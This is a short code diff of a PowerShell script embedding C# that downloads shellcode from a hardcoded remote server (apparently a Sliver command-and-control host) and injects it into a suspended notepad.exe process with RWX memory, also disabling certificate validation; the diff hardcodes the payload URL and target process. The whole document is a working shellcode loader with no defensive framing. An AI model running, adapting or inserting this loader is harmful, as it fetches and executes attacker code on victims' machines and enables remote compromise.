@@ -130,18 +130,18 @@ namespace MyLibrary
                 }
             }
 
-            public static void DownloadAndExecute(string url, string targetBinary)
+            public static void DownloadAndExecute()
             {
                 ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                 System.Net.WebClient client = new WebClientWithTimeout();
-
+                string url = "http://sliver.cardworks.dev:8000/loader.bin";
                 byte[] sc = client.DownloadData(url);
 
                 Int32 size = sc.Length;
                 StartupInfo sInfo = new StartupInfo();
                 sInfo.dwFlags = 0;
                 ProcessInformation pInfo;
-                string binaryPath = targetBinary;
+                string binaryPath = "c:\\windows\\system32\\notepad.exe";
                 IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
                 IntPtr hProcess = pInfo.hProcess;
                 IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
@@ -169,4 +169,4 @@ $url = "http://sliver.cardworks.dev:8000/loader.bin"
 $targetBinary = "c:\\windows\\system32\\notepad.exe"
 
 Add-Type -TypeDefinition $code -Language CSharp
-[MyLibrary.Class1]::DownloadAndExecute($url, $targetBinary)
+[MyLibrary.Class1]::DownloadAndExecute()
